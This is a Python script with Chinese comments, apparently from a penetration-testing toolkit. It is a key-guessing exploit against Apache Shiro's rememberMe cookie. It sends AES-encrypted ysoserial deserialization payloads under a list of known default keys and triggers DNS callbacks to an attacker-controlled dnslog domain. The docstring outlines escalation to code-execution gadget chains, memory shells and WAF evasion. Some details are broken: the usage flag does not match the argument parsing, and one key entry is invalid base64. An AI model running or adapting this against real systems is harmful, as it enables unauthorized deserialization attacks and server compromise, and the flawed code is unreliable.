#!/usr/bin/env python3
"""Shiro rememberMe key 无害探测（模板，未针对任何真实目标验证）。

判据（deleteMe 消失 oracle，全程无命令执行）：
  1) 指纹确认：无 Cookie 请求 → 响应 Set-Cookie: rememberMe=deleteMe ⇒ Shiro 存在
  2) key 探测：对每个候选 key 构造 rememberMe=base64( IV(16B) + AES-CBC(key, IV, payload) ) 发送
     - payload 用 ysoserial 生成 URLDNS 链（JRMPClient 亦可），序列化内容只含 DNS 解析动作
     - key 正确 ⇒ 服务端成功反序列化 ⇒ 响应不再回 Set-Cookie: rememberMe=deleteMe
     - key 错误 ⇒ 解密失败 ⇒ 仍然回 deleteMe
  3) 双重确认：key 判定命中的同时，dnslog 收到回连 ⇒ 定性（key=xxx，链=URLDNS）
  4) 利用升级（需另行授权）：把 URLDNS 换 CommonsBeanutils/CommonsCollections 系 + 内存马/回显，
     工具链参照 SummerSec/ShiroAttack2；WAF 对抗（Header 长度/分块/短 payload）见 framework-shiro 技能

用法：
  1) 先用 ysoserial 生成无害 payload（用自己的 dnslog 域）：
     java -jar ysoserial.jar URLDNS 'http://shiro-probe.<你的dnslog域>/a' > urldns.ser
  2) python3 detect.py https://target/ --ser urldns.ser
  输出：指纹状态 + 命中 key（命中即停）

纪律：
  - URLDNS 链仅触发一次 DNS 解析，无命令执行、无文件落地；确认 key 后不要在未授权目标上升级利用
  - 证据（响应头截图 + dnslog 记录）脱敏后回填 knowledge.db：category=deserialization, component=Shiro
"""
import base64
import sys
import urllib.request

# 常见默认/泄露 key（AES-128，CBC，PKCS5）——完整表见 ShiroAttack2 项目内置 key 列表
COMMON_KEYS = [
    "kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==",
    "4AvVhmFLUs0KTA3Kprsdag==", "Z3Vuc24vdmlzaW9u", "wUiHxcmy3xpYPK26bU2HsQ==",
    "1QwlANDFgmIBAReFvoU9Eg==", "fCq+/FGx9vCZ4wyNC8Dzhg==", "bWluZS1hc3NldC1rZXk6NTU2",
    "ZUeNEG9jB MPN3ntGaTRKmg==", "5AvVhmFLUs0KTA3Kprsdag==", "6AvVhmFLUs0KTA3Kprsdag==",
    "7AvVhmFLUs0KTA3Kprsdag==", "8AvVhmFLUs0KTA3Kprsdag==", "9AvVhmFLUs0KTA3Kprsdag==",
    " Zwv66HWDHkR3gf4h0hCSLw==", "IIIIIIIIIIIIIIIIIIIIIV=", "AAAAAAAAAAAAAAAAAAAAAA==",
]

def fingerprint(url, timeout=8):
    req = urllib.request.Request(url)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            sc = r.headers.get_all("Set-Cookie") or []
    except Exception:
        return False
    return any("rememberMe=deleteMe" in c for c in sc)

def probe_key(base_url, key_b64, ser_bytes, timeout=8):
    key = base64.b64decode(key_b64)
    iv = bytes(range(16))  # 固定 IV 即可（oracle 看的是 deleteMe 与否）
    data = iv + aes_cbc_encrypt(key, iv, ser_bytes)
    cookie = base64.b64encode(data).decode()
    req = urllib.request.Request(base_url, headers={"Cookie": f"rememberMe={cookie}"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            sc = r.headers.get_all("Set-Cookie") or []
    except Exception:
        return None  # 网络错误不计判定
    if not any("rememberMe=deleteMe" in c for c in sc):
        return key_b64
    return None

def aes_cbc_encrypt(key, iv, data):
    try:
        from Crypto.Cipher import AES  # pycryptodome
    except ImportError:
        sys.exit("需要 pycryptodome: pip install pycryptodome")
    pad = 16 - len(data) % 16
    data += bytes([pad]) * pad
    return AES.new(key, AES.MODE_CBC, iv).encrypt(data)

def main():
    ap = sys.argv
    if len(ap) < 3:
        print(__doc__)
        sys.exit(1)
    url, ser_path = ap[1], ap[2]
    ser = open(ser_path, "rb").read()
    if not fingerprint(url):
        print("无 rememberMe=deleteMe 指纹 —— 非 Shiro 或已隐藏，停止")
        return
    print("Shiro 指纹确认（deleteMe）→ 开始 key 探测")
    for k in COMMON_KEYS:
        if len(base64.b64decode(k)) not in (16,):
            continue  # 只试 16 字节 key（AES-128）
        hit = probe_key(url, k, ser)
        if hit:
            print(f"命中 key: {hit}  ←—— 配合 dnslog 回连即可定性")
            return
    print("常见 key 未命中（可能自定义 key / Shiro≥1.4.2 GCM / 随机 key）")

if __name__ == "__main__":
    main()
